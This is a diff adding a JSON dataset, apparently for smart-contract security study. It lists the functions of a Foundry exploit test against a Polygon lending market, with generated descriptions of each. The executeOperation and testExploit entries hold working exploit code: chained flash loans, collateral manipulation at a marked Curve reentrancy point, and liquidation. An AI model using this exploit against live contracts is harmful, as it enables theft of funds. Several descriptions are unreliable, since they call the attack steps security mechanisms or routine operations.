@@ -1,0 +1,254 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": "1. **Core functions**:  \nThis function is designed to provide a list of artifacts (items or elements) that are excluded from certain operations or processes within the smart contract. It acts as a simple retrieval mechanism to access the predefined list of excluded artifacts.\n\n2. **Security mechanism**:  \nThe function is marked as `public` and `view`, ensuring it can be called by anyone but does not modify the state of the contract. This prevents any unintended changes to the contract's data. Additionally, the function directly returns a stored list (`_excludedArtifacts`), which is likely managed securely elsewhere in the contract.\n\n3. **Parameter Function**:  \nThis function does not take any parameters. It solely relies on the internal state of the contract to fetch and return the list of excluded artifacts.\n\n4. **Return description**:  \nThe function returns an array of strings (`string[] memory`) that represents the list of excluded artifacts. The value returned is directly taken from the contract's internal storage variable `_excludedArtifacts`, without any additional calculations or transformations.\n\nIn summary, this function serves as a straightforward way to retrieve a list of excluded artifacts from the contract, ensuring it is accessible in a read-only manner without altering the contract's state."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": "1. Core functions:  \nThis function is designed to provide a list of contract addresses that have been excluded from certain operations or rules within the smart contract. It allows users or other contracts to view which contracts are currently excluded.\n\n2. Security mechanism:  \nThe function is marked as `public` and `view`, meaning it can be called by anyone but does not modify the state of the contract. This ensures that it is safe to call without risking any unintended changes to the contract's data.\n\n3. Parameter Function:  \nThe function does not take any parameters. It simply retrieves and returns the list of excluded contract addresses stored in the `_excludedContracts` variable.\n\n4. Return description:  \nThe function returns an array of addresses (`address[] memory excludedContracts_`). This array contains all the contract addresses that have been excluded, as stored in the `_excludedContracts` variable. The return value is a direct copy of this stored list.\n\nIn summary, this function is a simple read-only utility that provides a list of excluded contract addresses, ensuring transparency and accessibility without altering the contract's state."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": "1. **Core function**:  \nThis function is designed to retrieve and return a list of addresses that have been excluded from certain operations or interactions within the smart contract. It provides a way to view which addresses are currently marked as excluded.\n\n2. **Security mechanism**:  \nThe function is marked as `public` and `view`, meaning it can be called by anyone but does not modify the state of the contract. This ensures that it is safe to call without risking any unintended changes to the contract's data.\n\n3. **Parameter Function**:  \nThe function does not take any parameters. It simply accesses and returns the stored list of excluded addresses.\n\n4. **Return description**:  \nThe function returns an array of addresses (`address[] memory`) that represent the list of excluded senders. The value returned is directly taken from the internal storage variable `_excludedSenders`.\n\n**In summary**, this function is a simple read-only utility that allows anyone to view the list of addresses excluded from specific operations in the smart contract. It is safe to use and does not require any input parameters."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        if (msg.sender == address(aaveV3)) {\n            WMATIC.approve(address(aaveV3), type(uint256).max);\n            aaveV2Flashloan();\n            return true;\n        } else {\n            WMATIC.approve(address(aaveV2), type(uint256).max);\n            address[] memory cTokens = new address[](5);\n            cTokens[0] = address(WMATIC_STMATIC);\n            cTokens[1] = address(FJCHF);\n            cTokens[2] = address(FJEUR);\n            cTokens[3] = address(FJGBP);\n            cTokens[4] = address(FAGEUR);\n            unitroller.enterMarkets(cTokens);\n            WMATIC.approve(address(curvePool), type(uint256).max);\n            STMATCI_F.approve(address(WMATIC_STMATIC), type(uint256).max);\n            curvePool.add_liquidity([uint256(0), uint256(270_000 * 1e18)], 0);\n            uint256 mintAmount = STMATCI_F.balanceOf(address(this));\n            WMATIC_STMATIC.mint(mintAmount); // deposit collateral\n            uint256 WMMATICAmount = WMATIC.balanceOf(address(this));\n            console.log(\n                \"Before reentrancy collateral price\", oraclePrice.getUnderlyingPrice(address(WMATIC_STMATIC)) / 1e18\n            );\n            uint256 LPAmount = curvePool.add_liquidity([uint256(0), WMMATICAmount], 0);\n            curvePool.remove_liquidity(LPAmount, [uint256(0), uint256(0)], true); // reentrancy point\n            liquidate();\n            curvePool.remove_liquidity_one_coin(STMATCI_F.balanceOf(address(this)), 1, 0, false);\n            swapAll();\n            return true;\n        }\n",
+    "description": "1. **Core functions:**  \n   The `executeOperation` function is designed to handle a financial operation involving multiple assets and protocols. It checks the sender's address to determine which protocol (Aave V3 or Aave V2) is being used. If the sender is Aave V3, it approves the maximum amount of WMATIC tokens for Aave V3 and triggers a flash loan operation. If the sender is not Aave V3, it prepares for a more complex operation involving multiple tokens, liquidity pools, and collateral management. This includes approving tokens, entering markets, adding liquidity to a pool, minting collateral, and executing liquidation or swap operations. The function ensures that the necessary steps are taken to manage assets and interact with decentralized finance (DeFi) protocols effectively.\n\n2. **Security mechanism:**  \n   The function includes several security measures to protect against unauthorized access and ensure proper execution. It checks the sender's address (`msg.sender == address(aaveV3)`) to verify that the call is coming from a trusted protocol (Aave V3). It also uses `approve` to grant maximum spending allowances to specific contracts, ensuring that only authorized contracts can interact with the tokens. Additionally, the function logs critical information (e.g., collateral price) for monitoring and debugging purposes. However, the function includes a potential reentrancy point during liquidity removal, which could be exploited if not properly secured.\n\n3. **Parameter Function:**  \n   - `assets`: An array of asset addresses involved in the operation.  \n   - `amounts`: An array of amounts corresponding to the assets.  \n   - `premiums`: An array of premiums associated with the assets, likely related to flash loan fees.  \n   - `initiator`: The address that initiated the operation.  \n   - `params`: Additional data passed to the function for customization.  \n   These parameters provide the necessary context for the function to execute the correct operations based on the assets, amounts, and other details provided.\n\n4. **Return description:**  \n   The function returns a boolean value (`true`) to indicate successful execution. The return value does not involve complex calculations but serves as a confirmation that the operation has been completed as intended.  \n\n**In summary,**  \nThe `executeOperation` function is a versatile tool for managing DeFi operations, including flash loans, liquidity provision, and collateral management. It uses security checks and approvals to ensure safe interactions with protocols but has a potential reentrancy vulnerability that needs attention. The parameters provide the necessary context for the function to execute correctly, and the return value confirms successful completion."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": "1. **Core functions**:  \n   The `failed()` function is designed to check whether a certain failure condition has occurred. It looks at a stored variable `_failed` to determine if the failure has already been recorded. If `_failed` is not set, it checks an external storage location (using `vm.load`) to see if a failure has been flagged there. Essentially, it acts as a status checker for a failure state.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract, making it safe to call without incurring gas costs or altering data. Additionally, it relies on `vm.load` to read from external storage, which is a secure way to access data without directly exposing sensitive information.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It operates solely based on the internal state (`_failed`) and external storage data retrieved via `vm.load`.\n\n4. **Return description**:  \n   The function returns a boolean value (`true` or `false`). If `_failed` is `true`, it immediately returns `true`. If `_failed` is not set, it checks the external storage using `vm.load`. If the retrieved value is not zero, it returns `true`, indicating a failure. Otherwise, it returns `false`, meaning no failure has been detected.\n\n**In summary**, the `failed()` function checks for a failure condition by examining both an internal variable and an external storage location. It is designed to be safe and efficient, returning `true` if a failure is detected and `false` otherwise."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        aaveV3Flashloan();\n        WMATIC.transfer(address(balancer), balancerFlashloanAmount);\n    }\n\n",
+    "description": "1. **Core functions**:  \n   The `receiveFlashLoan` function is designed to handle a flash loan operation. It interacts with two external systems: Aave V3 for the flash loan and Balancer for transferring funds. Specifically, it calls the `aaveV3Flashloan` function to initiate the flash loan and then transfers a specified amount of WMATIC (Wrapped MATIC) tokens to the Balancer contract.\n\n2. **Security mechanism**:  \n   - The function is marked as `external`, meaning it can only be called from outside the contract, ensuring it is not invoked internally by mistake.  \n   - There are no explicit access control modifiers (like `onlyOwner`), so it is open to any external caller, which could be a security risk if not intended.  \n   - The function does not include checks for reentrancy, which could expose it to attacks if the `aaveV3Flashloan` or `WMATIC.transfer` functions are vulnerable.  \n\n3. **Parameter Function**:  \n   - `tokens`: An array of token addresses involved in the flash loan.  \n   - `amounts`: An array of corresponding amounts for each token in the flash loan.  \n   - `feeAmounts`: An array of fees associated with the flash loan for each token.  \n   - `userData`: Additional data that can be passed to customize the flash loan operation.  \n   These parameters provide the necessary details for the flash loan, but the function does not directly use them in the provided code snippet.  \n\n4. **Return description**:  \n   The function does not return any value. Its purpose is to execute the flash loan and transfer WMATIC tokens to Balancer, rather than computing or providing an output.  \n\nIn summary, the `receiveFlashLoan` function facilitates a flash loan operation by interacting with Aave V3 and Balancer. It lacks explicit security measures like access control or reentrancy protection, and its parameters define the details of the flash loan, though they are not directly used in the provided code. The function does not return any value, focusing solely on executing the loan and transfer."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"https://polygon.llamarpc.com\", 38_118_347);\n        cheats.label(address(balancer), \"balancer\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(aaveV2), \"aaveV2\");\n        cheats.label(address(unitroller), \"unitroller\");\n        cheats.label(address(curvePool), \"curvePool\");\n        cheats.label(address(EURCurvePool), \"EURCurvePool\");\n        cheats.label(address(oraclePrice), \"oraclePrice\");\n        cheats.label(address(WMATIC_STMATIC), \"WMATIC_STMATIC\");\n        cheats.label(address(KyberRouter), \"KyberRouter\");\n        cheats.label(address(UniRouter), \"UniRouter\");\n        cheats.label(address(oraclePrice), \"oraclePrice\");\n        cheats.label(address(FJCHF), \"FJCHF\");\n        cheats.label(address(FJEUR), \"FJEUR\");\n        cheats.label(address(FJGBP), \"FJGBP\");\n        cheats.label(address(FAGEUR), \"FAGEUR\");\n        cheats.label(address(WMATIC), \"WMATIC\");\n        cheats.label(address(STMATCI_F), \"STMATCI_F\");\n        cheats.label(address(STMATCI), \"STMATCI\");\n        cheats.label(address(USDC), \"USDC\");\n    }\n\n",
+    "description": "1. **Core functions:**  \nThe `setUp` function is primarily responsible for initializing and labeling various smart contract addresses in a testing or development environment. It uses a tool called `cheats` to create a simulated blockchain fork from a specific network (Polygon in this case) and assigns human-readable labels to different contract addresses. This helps in identifying and interacting with these contracts more easily during testing or debugging.\n\n2. **Security mechanism:**  \nThe function itself does not include explicit security mechanisms like access control or input validation because it is likely intended for use in a testing environment rather than production. However, the use of `cheats` suggests it is part of a testing framework, which inherently isolates it from real-world blockchain interactions, reducing potential risks.\n\n3. **Parameter Function:**  \nThe function does not take any parameters. It operates entirely on predefined contract addresses and labels them using the `cheats.label` method. This simplifies the setup process by avoiding the need for external inputs.\n\n4. **Return description:**  \nThe function does not return any value. Its purpose is purely to set up the environment by labeling contract addresses and creating a simulated blockchain fork, so it performs its tasks without producing an output.\n\n**In summary,**  \nThe `setUp` function is a utility for preparing a testing environment by labeling contract addresses and simulating a blockchain fork. It does not require parameters or return values, and its focus is on ease of use and clarity during development or testing."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": "1. Core functions:  \nThis function is designed to provide a list of specific selectors (identifiers) for artifacts that are being targeted. It acts as a simple retrieval mechanism, allowing users or other parts of the system to access the stored list of selectors without modifying it.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it only reads data from the contract and does not make any changes to the state. This prevents unintended modifications and enhances security by restricting the function to read-only operations.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the stored list of targeted artifact selectors.\n\n4. Return description:  \nThe function returns an array of `FuzzSelector` objects, which represent the list of targeted artifact selectors. The output is directly taken from the internal variable `_targetedArtifactSelectors`, meaning it reflects the current state of this variable without any additional calculations or transformations.\n\nIn summary, this function is a straightforward read-only tool that provides access to a predefined list of targeted artifact selectors, ensuring data integrity by preventing any state changes."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": "1. **Core functions**:  \n   This function is designed to retrieve and return a list of targeted artifacts. It acts as a simple data accessor, allowing external users or other parts of the smart contract to view the stored list of artifacts without modifying it.\n\n2. **Security mechanism**:  \n   The function uses the `public` and `view` modifiers. The `public` modifier ensures that the function can be called from outside the contract, while the `view` modifier guarantees that the function does not alter the state of the contract, making it read-only and safe to call without incurring gas costs.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It directly accesses and returns the internal list of targeted artifacts stored in the `_targetedArtifacts` variable.\n\n4. **Return description**:  \n   The function returns the `_targetedArtifacts` array, which contains a list of strings representing the targeted artifacts. The return value is a direct copy of the internal array, ensuring that the original data remains unchanged.\n\nIn summary, this function is a straightforward read-only utility that provides access to a list of targeted artifacts stored in the contract, ensuring data integrity and security through its `view` modifier."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": "1. **Core functions**:  \n   The `targetContracts` function is designed to provide a list of contract addresses that are being targeted or monitored by the current contract. It acts as a simple retrieval mechanism to access the stored addresses.\n\n2. **Security mechanism**:  \n   The function is marked as `public` and `view`, meaning it can be called by anyone but does not modify the state of the contract. This ensures that it is safe to use without risking any unintended changes to the contract's data.\n\n3. **Parameter Function**:  \n   The function does not take any parameters, as its sole purpose is to return the list of targeted contract addresses stored in the `_targetedContracts` variable.\n\n4. **Return description**:  \n   The function returns an array of addresses (`address[] memory`) stored in the `_targetedContracts` variable. It directly retrieves and outputs this list without any additional calculations or transformations.\n\n**In summary**, the `targetContracts` function is a straightforward utility that allows anyone to view the list of contract addresses being targeted by the current contract, ensuring transparency and ease of access."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": "1. Core functions:  \nThe `targetInterfaces` function is designed to provide a list of interfaces that are being targeted or focused on within the smart contract. It acts as a simple retrieval mechanism, allowing external users or other parts of the contract to access this list without modifying it.\n\n2. Security mechanism:  \nThe function includes the `view` modifier, which ensures that it does not alter the state of the contract. This means it only reads data and does not perform any actions that could change the contract's storage or behavior. Additionally, the function is `public`, making it accessible to anyone, but its read-only nature prevents unauthorized modifications.\n\n3. Parameter Function:  \nThe function does not take any parameters, meaning it does not require any external input to perform its task. It simply retrieves and returns the stored list of targeted interfaces.\n\n4. Return description:  \nThe function returns an array of `FuzzInterface` objects, which represents the list of interfaces being targeted. The value returned is directly taken from the internal storage variable `_targetedInterfaces`, ensuring that the output is an exact copy of the stored data.\n\nIn summary,  \nThe `targetInterfaces` function is a straightforward, read-only function that retrieves and returns a list of targeted interfaces from the contract's storage. It is secure in its design, as it does not modify any data and is accessible to all users."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": "1. **Core functions**:  \n   This function is designed to retrieve and return a list of targeted selectors. These selectors are likely used in a testing or fuzzing context to focus on specific functions or operations within a smart contract. Essentially, it acts as a simple getter function to access predefined selectors.\n\n2. **Security mechanism**:  \n   The function uses the `public` and `view` modifiers. The `public` modifier allows the function to be called from outside the contract, while the `view` modifier ensures that the function does not modify the state of the contract, making it safe to call without any risk of altering data.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It simply accesses and returns an internal variable (`_targetedSelectors`) that holds the list of targeted selectors.\n\n4. **Return description**:  \n   The function returns the value of `_targetedSelectors`, which is an array of `FuzzSelector` objects. The return value is directly assigned from the internal variable, so no additional calculation or logic is applied to the output.\n\n**In summary**, this function is a straightforward getter that provides access to a predefined list of targeted selectors, ensuring safety and immutability through its `view` modifier."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": "1. Core functions:  \nThis function is designed to provide a list of addresses that have been specifically targeted or marked for some purpose within the smart contract. It allows anyone to view these addresses without making any changes to the contract's state.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it only reads data from the contract and does not modify it. This prevents any unintended changes to the contract's state. Additionally, since it is marked as `public`, it can be accessed by anyone, but the `view` modifier ensures it remains read-only.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the list of targeted sender addresses stored in the `_targetedSenders` variable.\n\n4. Return description:  \nThe function returns an array of addresses (`address[] memory targetedSenders_`). The returned value is a direct copy of the `_targetedSenders` array, which contains the addresses that have been previously marked or targeted within the contract.\n\nIn summary,  \nThis function is a read-only utility that provides a list of targeted sender addresses stored in the contract. It is safe to use as it does not modify any data and can be accessed by anyone."
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        payable(address(0)).transfer(address(this).balance);\n        balancerFlashloan();\n\n        emit log_named_decimal_uint(\n            \"Attacker WMATIC balance after exploit\", WMATIC.balanceOf(address(this)), WMATIC.decimals()\n        );\n    }\n\n",
+    "description": "1. **Core functions**:  \n   The `testExploit` function is designed to perform two main actions. First, it sends all the funds (Ether) held by the contract to the zero address, effectively burning the Ether. Second, it triggers a function called `balancerFlashloan`, which likely interacts with a flash loan mechanism to borrow and manipulate assets. Finally, it emits an event to log the attacker's balance of a specific token (WMATIC) after the exploit is executed.\n\n2. **Security mechanism**:  \n   The function does not include explicit security measures like access control or checks for reentrancy. It directly transfers the contract's balance to the zero address, which is irreversible. The use of `payable(address(0)).transfer` ensures that the Ether is sent securely without the risk of reverting due to gas limits. However, the lack of restrictions on who can call this function makes it potentially dangerous if exposed publicly.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. It operates solely on the contract's current state, such as its Ether balance and the balance of the WMATIC token held by the contract.\n\n4. **Return description**:  \n   The function does not return any value. Instead, it emits an event that logs the attacker's WMATIC balance after the exploit. The balance is calculated by calling `WMATIC.balanceOf(address(this))`, which retrieves the amount of WMATIC tokens owned by the contract. This value is then formatted using the token's decimal precision for readability.\n\nIn summary, the `testExploit` function is a demonstration of an exploit that burns the contract's Ether, triggers a flash loan, and logs the attacker's WMATIC balance. It lacks security measures to restrict access, making it risky if used inappropriately."
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "A",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "add_liquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "admin_fee",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "balances",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "calc_token_amount",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "coins",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "exchange",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "exchange_underlying",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "fee",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "future_A",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "future_admin_fee",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "future_fee",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "get_dy",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "get_dy_underlying",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "get_virtual_price",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "remove_liquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "remove_liquidity_imbalance",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "remove_liquidity_one_coin",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICurvePools",
+    "source_type": "victim_contract",
+    "function_name": "underlying_coins",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "LiquidateContract",
+    "source_type": "victim_contract",
+    "function_name": "liquidate",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PriceProvider",
+    "source_type": "victim_contract",
+    "function_name": "getUnderlyingPrice",
+    "original_code": "",
+    "description": ""
+  }
+]
